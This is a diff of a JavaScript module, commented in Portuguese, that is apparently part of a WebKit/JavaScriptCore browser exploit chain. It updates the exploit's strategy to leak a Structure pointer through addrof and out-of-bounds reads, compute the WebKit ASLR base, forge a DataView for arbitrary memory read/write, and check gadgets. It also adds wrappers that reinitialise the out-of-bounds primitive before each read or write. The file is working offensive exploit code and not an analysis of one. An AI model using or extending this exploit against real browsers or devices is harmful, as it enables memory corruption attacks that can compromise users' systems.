@@ -1,8 +1,12 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v158 - Foco ABSOLUTO na Reocupação UAF/Type Confusion)
+// js/script3/testArrayBufferVictimCrash.mjs (v166 - Estratégia: Vazamento ASLR Direto, OOB Recriado por Operação)
 // =======================================================================================
-// ESTA VERSÃO FOCA EM ESTABILIZAR E APRIMORAR A CONDIÇÃO DE USE-AFTER-FREE E TYPE CONFUSION.
-// A reocupação exata da memória da vítima é a prioridade para o vazamento ASLR.
-// Novas técnicas de Heap Feng Shui agressivas e multi-camadas.
+// ESTA VERSÃO FOCA EM:
+// 1. **Delegar a re-inicialização do ambiente OOB para cada chamada a arb_read/arb_write (via wrappers).**
+//    Isso garante que a primitiva OOB seja sempre 'fresca' e tenta mitigar o problema do 'm_vector' zerado.
+// 2. Usar 'addrof_core' e 'oob_read_absolute' para vazar o ponteiro da Structure de um objeto ArrayBuffer.
+// 3. Com o ponteiro da Structure, calcular a base ASLR da WebKit.
+// 4. Se o vazamento ASLR for bem-sucedido, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
+// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -13,29 +17,43 @@ import {
     addrof_core,
     fakeobj_core,
     initCoreAddrofFakeobjPrimitives,
-    arb_read, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
-    arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
+    arb_read as core_arb_read, // Renomeado para evitar conflito com a nova arb_read wrapper
+    arb_write as core_arb_write, // Renomeado para evitar conflito com a nova arb_write wrapper
     selfTestOOBReadWrite,
     oob_read_absolute,
     oob_write_absolute
-} from '../core_exploit.mjs'; // core_exploit.mjs deve estar na versão v31.13
+} from '../core_exploit.mjs'; // core_exploit.mjs DEVE ESTAR NA VERSÃO v31.16
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // ATENÇÃO: Esta constante será atualizada a cada nova versão de teste
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v158_HEAP_FENG_SHUI_EXTREME";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_ASLR_ARBRW_v166_OOB_PER_OP_REFRESH";
 
 // Pausas ajustadas para estabilidade em ambientes com recursos limitados
-const LOCAL_VERY_SHORT_PAUSE = 5;    // Ainda mais curta para timing crítico
-const LOCAL_SHORT_PAUSE = 50;       // Ajustado
-const LOCAL_MEDIUM_PAUSE = 250;     // Ajustado
-const LOCAL_LONG_PAUSE = 500;       // Ajustado
+const LOCAL_VERY_SHORT_PAUSE = 10;
+const LOCAL_SHORT_PAUSE = 100;
+const LOCAL_MEDIUM_PAUSE = 500;
+const LOCAL_LONG_PAUSE = 1000;
 
 let global_spray_objects = [];
 let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente
 
 // Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
 let _fake_data_view = null;
+
+
+// --- NOVAS FUNÇÕES WRAPPER para arb_read e arb_write ---
+// Estas funções garantirão que o ambiente OOB seja re-inicializado a cada chamada.
+async function arb_read(address, byteLength, logFn) {
+    await triggerOOB_primitive({ force_reinit: true }); // RE-INICIALIZA A OOB A CADA LEITURA
+    return await core_arb_read(address, byteLength, logFn);
+}
+
+async function arb_write(address, value, byteLength, logFn) {
+    await triggerOOB_primitive({ force_reinit: true }); // RE-INICIALIZA A OOB A CADA ESCRITA
+    return await core_arb_write(address, value, byteLength, logFn);
+}
+// --- FIM DAS NOVAS FUNÇÕES WRAPPER ---
 
 
 // Funções Auxiliares Comuns (dumpMemory)
@@ -156,7 +174,7 @@ function _int64ToDouble_direct(int64) {
  */
 async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
     const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
-    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);
+    logFn(`[${FNAME}] Tentando configurar L/E Arbitraria Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);
 
     _fake_data_view = null;
     let backing_array_buffer = null;
